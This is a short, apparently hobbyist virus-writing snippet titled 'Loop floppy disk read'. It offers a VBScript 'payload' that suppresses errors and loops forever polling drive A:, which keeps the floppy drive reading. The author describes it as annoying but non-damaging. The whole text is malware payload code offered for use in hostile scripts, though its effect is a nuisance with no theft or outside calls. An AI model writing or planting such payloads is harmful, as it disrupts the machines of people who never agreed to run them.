--------Loop floppy disk read--------

Description: This payloads has to be one of the most annoying
non-damaging payloads that I can think of. It simply makes the
floppy disk drive read at an infinate loop.

Here is the code:
-------------------------------------

On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set DriveA = fso.GetDrive("A:")
Do
If DriveA.IsReady Then DiskReady = True
Loop

-------------------------------------
